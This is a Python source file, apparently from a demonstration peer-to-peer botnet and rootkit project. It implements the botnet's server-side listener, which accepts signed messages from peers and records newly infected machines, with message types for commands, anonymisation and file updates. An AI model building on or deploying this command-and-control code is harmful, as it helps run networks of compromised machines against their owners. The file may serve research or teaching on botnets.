"""Server side of the p2p communication protocol"""

import threading

from botnet_p2p import logger

from botnet_p2p.comm_utils import NodeP2P

from botnet_p2p.operations import add_new_infected_machine

NEW_NODE = 0
UPDATE_PEER_LIST = 1
COMMAND = 2
ANONYMIZER = 3
UPDATE_FILE = 4

SERVER_HOST = "localhost"
SERVER_PORT = 50000
MAX_QUEUE = 4


def start_server():
    logger.info("Starting server ...")
    private_key = "/etc/rootkit_demo/private_key"
    public_key = "/etc/rootkit_demo/public/botnet_p2p/public_key"
    node_socket = NodeP2P(public_key, private_key)
    node_socket.bind(SERVER_HOST, SERVER_PORT)
    node_socket.listen(MAX_QUEUE)

    logger.info("Listening to new connections ...")
    while True:
        client_socket, addr = node_socket.accept()
        logger.info(f"New connection accepted")
        client_thread = threading.Thread(target=talk_with_client, args=(client_socket,))
        client_thread.start()

    node_socket.close()


def talk_with_client(client_socket: NodeP2P) -> None:
    """ Keep the connection alive with the client and exchange
        messages

        Args:
            client_socket: Socket used to talk with the client
    """
    logger.info("Receiving new message ...")
    msg_type, msg, trusted = client_socket.recv_signed_msg()

    if not msg_requires_to_be_signed(msg_type):
        add_new_infected_machine(msg)
    else:
        if trusted:
            logger.info("The message is trusted")
        else:
            logger.info("Someone is trying to break in")


def msg_requires_to_be_signed(msg_type: int) -> bool:
    """ Check if the message needs to be signed.

        Args:
            msg_type: Integer representing the type of message

        Returns:
            Whether the msg requires a valid hash
            or it does not need to be signed
    """
    return msg_type != NEW_NODE

start_server()
